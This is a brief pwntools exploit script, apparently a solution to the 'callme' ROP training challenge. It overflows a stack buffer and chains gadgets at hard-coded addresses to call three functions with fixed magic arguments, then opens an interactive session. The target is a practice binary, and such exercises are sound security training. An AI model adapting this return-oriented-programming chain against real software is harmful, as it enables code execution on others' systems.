from pwn import *

r = process("./callme")
#gdb.attach(r, api = True)

callme1 = 0x400720
callme2 = 0x400740
callme3 = 0x4006f0

agr1 = 0xdeadbeefdeadbeef
agr2 = 0xcafebabecafebabe
agr3 = 0xd00df00dd00df00d

ret_gadget = 0x00000000004006be
pop_rdi_rsi_rdx_ret = 0x000000000040093c

agr =  p64(ret_gadget) + p64(pop_rdi_rsi_rdx_ret) + p64(agr1) + p64(agr2) + p64(agr3)

payload = b'A'*40 + agr + p64(callme1) + agr + p64(callme2) + agr + p64(callme3)

r.sendline(payload)

r.interactive()